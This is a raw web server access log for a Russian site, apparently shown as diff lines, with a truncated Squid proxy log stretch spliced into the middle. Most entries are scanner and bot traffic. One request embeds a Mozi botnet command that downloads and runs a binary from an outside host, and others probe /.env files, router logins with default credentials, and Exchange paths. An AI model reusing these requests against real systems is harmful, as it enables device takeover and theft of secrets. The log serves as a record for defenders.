+159.203.63.170 - - [07/Sep/2022:08:53:41 +0500] "GET /ab2g HTTP/1.1" 404 4888 "-" "Mozilla/5.0 zgrab/0.x"
+159.203.63.170 - - [07/Sep/2022:08:53:41 +0500] "GET /ab2h HTTP/1.1" 404 4888 "-" "Mozilla/5.0 zgrab/0.x"
+159.203.63.170 - - [07/Sep/2022:08:53:45 +0500] "GET / HTTP/1.1" 200 4912 "-" "Mozilla/5.0 zgrab/0.x"
+159.203.63.170 - - [07/Sep/2022:08:53:45 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+198.199.95.35 - - [07/Sep/2022:08:57:26 +0500] "GET /login HTTP/1.1" 404 4888 "-" "Mozilla/5.0 zgrab/0.x"
+192.241.203.28 - - [07/Sep/2022:08:57:33 +0500] "GET /ReportServer HTTP/1.1" 404 4888 
+156.198.2.86 - - [07/Sep/2022:09:16:22 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+165.22.45.9 - - [07/Sep/2022:09:33:02 +0500] "GET / HTTP/1.1" 301 407 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
+192.241.198.50 - - [07/Sep/2022:09:33:13 +0500] "GET /owa/auth/x.js HTTP/1.1" 404 4888 "-" "Mozilla/5.0 zgrab/0.x"
+165.22.45.9 - - [07/Sep/2022:09:33:36 +0500] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
+192.241.196.63 - - [07/Sep/2022:09:34:26 +0500] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 4888 "-" "Mozilla/5.0 zgrab/0.x"
+192.241.208.55 - - [07/Sep/2022:09:36:04 +0500] "GET /owa/auth/logon.aspx HTTP/1.1" 404 4888 "-" "Mozilla/5.0 zgrab/0.x"
+20.119.96.169 - - [07/Sep/2022:09:46:23 +0500] "GET /.env HTTP/1.1" 301 471 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
+20.119.96.169 - - [07/Sep/2022:09:46:23 +0500] "POST / HTTP/1.1" 301 463 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
+200.125.232.34 - - [07/Sep/2022:10:26:09 +0500] "GET / HTTP/1.1" 200 487 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+181.214.218.69 - - [07/Sep/2022:10:35:05 +0500] "GET / HTTP/1.1" 200 421 "-" ""
+192.241.205.120 - - [07/Sep/2022:10:53:34 +0500] "GET / HTTP/1.1" 200 4912 "-" "Mozilla/5.0 zgrab/0.x"
+188.120.251.252 - - [07/Sep/2022:11:16:16 +0500] "GET / HTTP/1.1" 301 426 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+188.120.251.252 - - [07/Sep/2022:11:16:16 +0500] "GET / HTTP/1.1" 200 5261 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+143.92.32.175 - - [07/Sep/2022:11:36:24 +0500] "GET / HTTP/1.1" 200 5100 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html\xef\xbc\x89"
+167.248.133.46 - - [07/Sep/2022:11:42:46 +0500] "GET / HTTP/1.1" 200 5222 "-" "-"
+167.248.133.46 - - [07/Sep/2022:11:42:46 +0500] "GET / HTTP/1.1" 200 5100 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+167.248.133.46 - - [07/Sep/2022:11:42:47 +0500] "GET /favicon.ico HTTP/1.1" 404 5095 "-" "Go-http-client/1.1"
+109.248.6.56 - - [07/Sep/2022:11:53:02 +0500] "GET /favicon.ico HTTP/1.0" 404 5095 "-" "masscan-ng/1.3 (https://github.com/bi-zone/masscan-ng)"
+112.47.230.78 - - [07/Sep/2022:11:54:09 +0500] "GET / HTTP/1.1" 200 543 "-" "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)"
+81.150.76.31 - - [07/Sep/2022:12:01:05 +0500] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://81.150.76.31:38940/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 397 "-" "Hello, world"
+192.241.212.192 - - [07/Sep/2022:12:06:47 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+188.162.72.62 - - [07/Sep/2022:12:08:41 +0500] "GET / HTTP/1.1" 200 421 "-" "Mozilla/5.0"
+188.162.72.62 - - [07/Sep/2022:12:08:45 +0500] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 404 360 "-" "-"
+188.162.72.62 - - [07/Sep/2022:12:08:55 +0500] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 404 4975 "-" "-"
+128.14.141.34 - - [07/Sep/2022:12:24:37 +0500] "GET / HTTP/1.1" 200 4912 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+109.206.241.219 - - [07/Sep/2022:12:49:32 +0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 397 "http://2.57.187.139:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+205.210.31.159 - - [07/Sep/2022:12:57:59 +0500] "GET / HTTP/1.1" 200 487 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+185.108.106.155 - - [07/Sep/2022:13:09:19 +0500] "GET /.env HTTP/1.1" 301 471 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+185.108.106.155 - - [07/Sep/2022:13:09:20 +0500] "GET /.env HTTP/1.1" 404 5167 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+185.108.106.155 - - [07/Sep/2022:13:09:23 +0500] "GET /wp-content/ HTTP/1.1" 301 485 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+185.108.106.155 - - [07/Sep/2022:13:09:23 +0500] "GET /wp-content/ HTTP/1.1" 404 5167 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
+34.78.6.216 - - [07/Sep/2022:13:27:14 +0500] "GET / HTTP/1.1" 200 421 "-" "python-requests/2.28.1"
+66.249.75.236 - - [07/Sep/2022:13:31:55 +0500] "GET /robots.txt HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+66.249.75.250 - - [07/Sep/2022:13:31:55 +0500] "GET /robots.txt HTTP/1.1" 404 5136 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+66.249.75.232 - - [07/Sep/2022:13:31:56 +0500] "GET / HTTP/1.1" 301 463 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+66.249.75.250 - - [07/Sep/2022:13:31:57 +0500] "GET / HTTP/1.1" 200 442 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+138.99.216.93 - - [07/Sep/2022:13:31:58 +0500] "GET / HTTP/1.1" 200 365 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.15) Gecko/20101027 Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10"
+45.93.16.153 - - [07/Sep/2022:13:38:07 +0500] "GET / HTTP/1.1" 200 365 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+45.93.16.153 - - [07/Sep/2022:13:38:07 +0500] "GET /HNAP1/ HTTP/1.1" 404 341 "http://2.57.187.139/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+20.39.221.204 - - [07/Sep/2022:14:12:23 +0500] "HEAD /robots.txt HTTP/1.0" 404 143 "-" "-"
+109.206.241.219 - - [07/Sep/2022:14:18:11 +0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 397 "http://2.57.187.139:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+186.33.73.139 - - [07/Sep/2022:14:21:51 +0500] "GET / HTTP/1.1" 200 487 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+94.102.61.8 - - [07/Sep/2022:14:33:41 +0500] "GET / HTTP/1.1" 200 4912 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
+66.249.72.163 - - [07/Sep/2022:15:01:54 +0500] "GET /robots.txt HTTP/1.1" 404 397 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+66.249.72.163 - - [07/Sep/2022:15:01:54 +0500] "GET / HTTP/1.1" 200 420 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+143.92.32.175 - - [07/Sep/2022:15:02:58 +0500] "GET / HTTP/1.1" 200 5100 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html\xef\xbc\x89"
+128.14.133.58 - - [07/Sep/2022:15:32:42 +0500] "GET / HTTP/1.1" 200 365 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+138.246.253.24 - - [07/Sep/2022:15:59:14 +0500] "GET /robots.txt HTTP/1.1" 404 5076 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
+41.43.159.96 - - [07/Sep/2022:16:05:10 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+109.205.213.20 - - [07/Sep/2022:16:13:57 +0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 397 "http://2.57.187.139:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+128.14.134.134 - - [07/Sep/2022:16:19:38 +0500] "GET / HTTP/1.1" 200 4912 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+92.118.39.30 - - [07/Sep/2022:16:29:04 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+66.249.76.99 - - [07/Sep/2022:16:31:55 +0500] "GET / HTTP/1.1" 301 463 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+66.249.76.122 - - [07/Sep/2022:16:31:56 +0500] "GET / HTTP/1.1" 200 5160 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+111.92.116.169 - - [07/Sep/2022:16:36:03 +0500] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 360 "-" "-"
+120.48.54.32 - - [07/Sep/2022:16:39:53 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+92.118.39.88 - - [07/Sep/2022:16:44:50 +0500] "GET / HTTP/1.1" 200 487 "-" "-"
+156.223.178.237 - - [07/Sep/2022:16:52:47 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+130.211.54.158 - - [07/Sep/2022:16:55:08 +0500] "GET / HTTP/1.1" 200 4983 "-" "python-requests/2.28.1"
+197.32.79.45 - - [07/Sep/2022:17:32:15 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+20.119.96.169 - - [07/Sep/2022:17:48:42 +0500] "GET /.env HTTP/1.1" 301 471 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
+20.119.96.169 - - [07/Sep/2022:17:48:43 +0500] "POST / HTTP/1.1" 301 463 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/ HTTP/1.1" 200 6120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/style.css HTTP/1.1" 200 1675 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/moduli/ckeditor/adapters/jquery.js HTTP/1.1" 200 1880 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/moduli/zoom_img/style_zoom.css HTTP/1.1" 200 925 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/moduli/zoom_img/script_zoom.js HTTP/1.1" 200 1325 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/moduli/zoom_img/jquery.min_2.1.4.js HTTP/1.1" 200 30349 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/moduli/ckeditor/ckeditor.js HTTP/1.1" 200 214177 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /favicon.ico HTTP/1.1" 404 418 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/moduli/ckeditor/config.js?t=J8Q8 HTTP/1.1" 200 754 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/moduli/ckeditor/skins/moono-lisa/editor_gecko.css?t=J8Q8 HTTP/1.1" 200 6487 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/moduli/ckeditor/lang/ru.js?t=J8Q8 HTTP/1.1" 200 9617 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:12 +0500] "GET /zam/moduli/ckeditor/styles.js?t=J8Q8 HTTP/1.1" 200 2131 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:13 +0500] "GET /zam/moduli/ckeditor/plugins/scayt/dialogs/dialog.css?t=J8Q8 HTTP/1.1" 200 587 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:13 +0500] "GET /zam/moduli/ckeditor/plugins/tableselection/styles/tableselection.css HTTP/1.1" 200 813 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:13 +0500] "GET /zam/moduli/ckeditor/plugins/scayt/skins/moono-lisa/scayt.css?t=J8Q8 HTTP/1.1" 200 568 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:13 +0500] "GET /zam/moduli/ckeditor/plugins/wsc/skins/moono-lisa/wsc.css?t=J8Q8 HTTP/1.1" 200 660 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:13 +0500] "GET /zam/moduli/ckeditor/plugins/dialog/styles/dialog.css HTTP/1.1" 200 825 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:13 +0500] "GET /zam/moduli/ckeditor/plugins/copyformatting/styles/copyformatting.css HTTP/1.1" 200 1018 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:13 +0500] "GET /zam/moduli/ckeditor/contents.css?t=J8Q8 HTTP/1.1" 200 1585 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:13 +0500] "GET /zam/moduli/ckeditor/skins/moono-lisa/icons.png?t=83e9de8d6b HTTP/1.1" 200 12736 "https://zp174.ru/zam/moduli/ckeditor/skins/moono-lisa/editor_gecko.css?t=J8Q8" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+::1 - - [07/Sep/2022:17:54:19 +0500] "OPTIONS * HTTP/1.0" 200 110 "-" "Apache/2.4.52 (Debian) OpenSSL/1.1.1k (internal dummy connection)"
+188.128.83.66 - - [07/Sep/2022:17:54:40 +0500] "POST /zam/ HTTP/1.1" 200 1711 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:41 +0500] "GET /favicon.ico HTTP/1.1" 404 418 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:47 +0500] "GET /zam/?page=spisok HTTP/1.1" 200 1292 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:47 +0500] "GET /favicon.ico HTTP/1.1" 404 418 "https://zp174.ru/zam/?page=spisok" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:49 +0500] "GET /zam/?page=spisok&temaid=4 HTTP/1.1" 200 3403 "https://zp174.ru/zam/?page=spisok" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:49 +0500] "GET /favicon.ico HTTP/1.1" 404 418 "https://zp174.ru/zam/?page=spisok&temaid=4" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:54:51 +0500] "GET /zam/ HTTP/1.1" 200 1711 "https://zp174.ru/zam/?page=spisok&temaid=4" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:55:16 +0500] "POST /zam/ HTTP/1.1" 200 1711 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:17:55:18 +0500] "GET /favicon.ico HTTP/1.1" 404 418 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+97.74.229.113 - - [07/Sep/2022:17:55:25 +0500] "GET /admin//config.php HTTP/1.1" 404 4855 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.27.1 zlib/1.2.3 libidn/1.18 libssh2/1.4.2"
+192.241.215.244 - - [07/Sep/2022:18:12:24 +0500] "GET /version HTTP/1.1" 404 4888 "-" "Mozilla/5.0 zgrab/0.x"
+188.128.83.66 - - [07/Sep/2022:18:23:13 +0500] "POST /zam/ HTTP/1.1" 200 6132 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+188.128.83.66 - - [07/Sep/2022:18:23:14 +0500] "GET /favicon.ico HTTP/1.1" 404 418 "https://zp174.ru/zam/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
+178.46.160.112 - - [07/Sep/2022:18:23:36 +0500] "GET /zam/?page=spisok&temaid=2 HTTP/1.1" 200 12210 "https://zp174.ru/zam/?page=spisok" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+178.46.160.112 - - [07/Sep/2022:18:23:36 +0500] "GET /zam/style.css HTTP/1.1" 200 1675 "https://zp174.ru/zam/?page=spisok&temaid=2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+178.46.160.112 - - [07/Sep/2022:18:23:36 +0500] "GET /zam/moduli/ckeditor/adapters/jquery.js HTTP/1.1" 200 1556 "https://zp174.ru/zam/?page=spisok&temaid=2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+178.46.160.112 - - [07/Sep/2022:18:23:36 +0500] "GET /zam/moduli/zoom_img/style_zoom.css HTTP/1.1" 200 925 "https://zp174.ru/zam/?page=spisok&temaid=2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+178.46.160.112 - - [07/Sep/2022:18:23:36 +0500] "GET /zam/moduli/zoom_img/script_zoom.js HTTP/1.1" 200 1325 "https://zp174.ru/zam/?page=spisok&temaid=2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+178.46.160.112 - - [07/Sep/2022:18:23:36 +0500] "GET /zam/moduli/zoom_img/jquery.min_2.1.4.js HTTP/1.1" 200 30349 "https://zp174.ru/zam/?page=spisok&temaid=2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+178.46.160.112 - - [07/Sep/2022:18:23:36 +0500] "GET /zam/moduli/ckeditor/ckeditor.js HTTP/1.1" 200 214501 "https://zp174.ru/zam/?page=spisok&temaid=2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+178.46.160.112 - - [07/Sep/2022:18:23:37 +0500] "GET /zam/moduli/kcfinder/upload/images/photo_2019-07-04_21-47-21.jpg HTTP/1.1" 304 255 "https://zp174.ru/zam/?page=spisok&temaid=2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+178.46.160.112 - - [07/Sep/2022:18:23:37 +0500] "GET /zam/moduli/kcfinder/upload/images/safeboot.jpg HTTP/1.1" 304 256 "https://zp174.ru/zam/?page=spisok&temaid=2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+178.46.160.112 - - [07/Sep/2022:18:23:38 +0500] "GET /zam/?page=spisok HTTP/1.1" 200 968 "https://zp174.ru/zam/?page=spisok&temaid=2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+178.46.160.112 - - [07/Sep/2022:18:23:39 +0500] "GET /zam/?page=spisok&temaid=4 HTTP/1.1" 200 3121 "https://zp174.ru/zam/?page=spisok" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
+::1 - - [07/Sep/2022:18:23:45 +0500] "OPTIONS * HTTP/1.0" 200 110 "-" "Apache/2.4.52 (Debian) OpenSSL/1.1.1k (internal dummy connection)"
+3.68.105.241 - - [07/Sep/2022:18:29:31 +0500] "CONNECT is.muni.cz:443 HTTP/1.1" 200 487 "-" "Java/1.8.0_312"
+3.68.105.241 - - [07/Sep/2022:18:29:31 +0500] "\x16\x03\x03\x01\x15\x01" 400 392 "-" "-"
+3.68.105.241 - - [07/Sep/2022:18:29:31 +0500] "CONNECT is.muni.cz:443 HTTP/1.1" 200 487 "-" "Java/1.8.0_312"
+1662546099.961      0 192.168.15.77 TCP_MEM_HIT/206 6330 GET http://edgedl.me.gvt1.com/edgedl/release2/chrome_component/adoa3glkwvnumwnxkzhbnwuv2ewa_355/efniojlnjndmcbiieegkicadnoecjjef_355_all_adpxiszv6uxd2gpvfyasd2v7326a.crx3 - HIER_NONE/- application/octet-stream
+1662546100.093  10113 192.168.15.77 TCP_TUNNEL/200 4439 CONNECT www.google.com:443 - HIER_DIRECT/64.233.164.106 -
+1662546100.449      0 192.168.77.41 TCP_DENIED/403 4142 CONNECT fp.msedge.net:443 - HIER_NONE/- text/html
+1662546100.628      0 192.168.15.46 TCP_DENIED/403 4351 POST http://origin.browser-sputnik.ru/service/update2? - HIER_NONE/- text/html
+1662546100.638      0 192.168.15.46 TCP_DENIED/403 4234 POST http://origin.browser-sputnik.ru/service/update2 - HIER_NONE/- text/html
+1662546100.679     51 192.168.13.128 TCP_MISS/200 361 POST http://7kas.sudrf.ru/eedb7bf2c6bcd951f826bd2b93c95bbc - HIER_DIRECT/84.42.111.139 text/html
+1662546100.728 240180 192.168.13.151 TCP_TUNNEL/200 1693 CONNECT clientservices.googleapis.com:443 - HIER_DIRECT/74.125.131.94 -
+1662546100.796 120956 192.168.12.15 TCP_TUNNEL/200 4439 CONNECT sync.bumlam.com:443 - HIER_DIRECT/31.172.81.160 -
+1662546101.574 240147 192.168.14.27 TCP_TUNNEL/200 1693 CONNECT clientservices.googleapis.com:443 - HIER_DIRECT/74.125.131.94 -
+1662546101.811  60082 192.168.12.95 TCP_TUNNEL/200 226 CONNECT static4.smi2.net:443 - HIER_DIRECT/185.162.95.4 -
+1662546101.862  60069 192.168.12.95 TCP_TUNNEL/200 226 CONNECT static4.smi2.net:443 - HIER_DIRECT/185.162.95.4 -
+1662546102.006  60161 192.168.12.95 TCP_TUNNEL/200 111207 CONNECT storage.mds.yandex.net:443 - HIER_DIRECT/213.180.204.158 -
+1662546102.068  60046 192.168.12.95 TCP_TUNNE
+128.14.133.58 - - [07/Sep/2022:02:32:09 +0500] "GET / HTTP/1.1" 200 4912 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+162.62.191.231 - - [07/Sep/2022:02:49:06 +0500] "GET / HTTP/1.1" 400 5127 "-" "curl/7.64.1"
+205.185.116.25 - - [07/Sep/2022:02:49:31 +0500] "GET / HTTP/1.1" 200 5160 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+205.185.116.25 - - [07/Sep/2022:02:49:31 +0500] "GET /favicon.ico HTTP/1.1" 404 418 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+8.45.47.67 - - [07/Sep/2022:02:49:37 +0500] "GET / HTTP/1.1" 200 5156 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+8.45.47.67 - - [07/Sep/2022:02:49:38 +0500] "GET /favicon.ico HTTP/1.1" 404 418 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
